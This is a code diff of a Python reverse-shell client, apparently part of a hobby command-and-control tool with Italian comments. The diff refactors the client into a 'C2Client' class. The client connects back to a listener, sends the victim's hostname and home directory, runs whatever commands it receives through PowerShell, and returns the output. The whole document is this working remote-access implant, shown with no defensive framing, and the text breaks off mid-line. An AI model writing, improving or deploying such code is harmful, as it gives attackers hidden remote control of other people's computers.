@@ -1,74 +1,82 @@
 import socket
-from subprocess import run, PIPE
+import subprocess
+import time
+import os
 
-boold = True
+class C2Client:
+    """Gestisce la connessione e l'esecuzione dei comandi sul lato client."""
+    
+    def __init__(self, host="127.0.0.1", port=8081):
+        self.host = host
+        self.port = port
+        self.socket = None
+        # Imposta la directory iniziale dell'utente
+        self.current_dir = os.path.expanduser("~")
+        self.hostname = socket.gethostname()
 
-
-def decrypt(enstring):
-    string = ""
-    for char in enstring:
-        string += chr(ord(char) - 25)
-    return string
-
-
-def encrypt(string):
-    enstring = ""
-    for char in string:
-        enstring += chr(ord(char) + 25)
-    return enstring
-
-
-def main():
-
-    host = "192.168.1.3"
-    port = 8081
-    cd = run(['powershell.exe', '/c', f'Set-Location "/users/$env:username"; (Get-Location).path'],
-        shell=True, stdout=PIPE, stderr=PIPE, text=True)
-    cd = (cd.stdout + cd.stderr).strip()
-
-    client = socket.socket()
-
-    while True:
-        try:
-            client.connect((host, port))
-        except (ConnectionRefusedError, socket.gaierror):
-            continue
-        else:
-            client.send(encrypt(cd).encode())
-            print(f'{host}@{port} Connected')
-            break
-
-    # Terminal
-    while True:
-        command = decrypt(client.recv(4096).decode(errors="replace")).strip()
-        if command == ".":
-            client.send(f".#path#{cd}".encode())
-        elif command == "cclose":
-            client.close()
-            return False
-        else:
-            if boold: print(f'\n{command}')
+    def connect(self):
+        """Tenta la connessione al server finché non ha successo."""
+        while True:
             try:
-                op = run(
-                    ['powershell.exe', '/c', f'Set-Location "{cd}"; {command}; ("#!p#" + (Get-Location))'],
-                    shell=True, stdout=PIPE, stderr=PIPE, text=True)
+                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.socket.connect((self.host, self.port))
+                
+                # Handshake iniziale: invia Path e Hostname al server
+                handshake_data = f"{self.current_dir}#{self.hostname}"
+                self.socket.send(handshake_data.encode('utf-8'))
+                
+                print(f"[*] Connesso a {self.host}:{self.port}")
+                return True
+            except (socket.error, ConnectionRefusedError):
+                print("[!] Server non trovato, riprovo in 5 secondi...")
+                time.sleep(5)
 
-            except Exception as e:
-                print(f'FileNotFoundError: {e}')
-            else:
-                stdop = op.stderr.strip().replace("#!p#", '##') + op.stdout.strip()
-                output, cd = stdop.split("#!p#")
-                if stdop == '':
-                    client.send(encrypt(f'.#path#{cd}'.encode()))
-                else:
-                    client.send(encrypt(f'{output}#path#{cd}').encode())
-
-
-if __name__ == "__main__":
-
-    goon = True
-    while goon:
+    def execute_command(self, command):
+        """Esegue il comando tramite PowerShell e cattura output e nuova posizione."""
         try:
-            goon = main()
-        except:
-            continue
+            # Script PowerShell per eseguire il comando e restituire la nuova directory
+            ps_script = f'Set-Location "{self.current_dir}"; {command}; "#!p#" + (Get-Location).Path'
+            
+            process = subprocess.run(
+                ['powershell.exe', '-Command', ps_script],
+                capture_output=True,
+                text=True,
+                shell=True
+            )
+            
+            full_output = process.stdout + process.stderr
+            
+            if "#!p#" in full_output:
+                output, new_path = full_output.strip().split("#!p#")
+                self.current_dir = new_path.strip()
+                return output if output.strip() else "."
+            else:
+                return full_output
+                
+        except Exception as e:
+            return f"Errore esecuzione: {str(e)}"
+
+    def run(self):
+        """Ciclo principale di ricezione ed esecuzione."""
+        while True:
+            if not self.socket or self.connect():
+                try:
+                    while True:
+                        # Riceve il comando dal server
+                        data = self.socket.recv(4096).decode('utf-8', errors="replace").strip()
+                        
+                        if not data:
+                            break
+                        
+                        if data == "cclose":
+                            print("[*] Chiusura connessione richiesta dal server.")
+                            self.socket.close()
+                            return
+
+                        # Esegue e risponde con il formato atteso: "output#path#nuovopath"
+                        result = self.execute_command(data)
+                        response = f"{result}#path#{self.current_dir}"
+                        self.socket.send(response.encode('utf-8'))
+
+                except (ConnectionResetError, BrokenPipeError):
+                    print("[!] Connessione inter
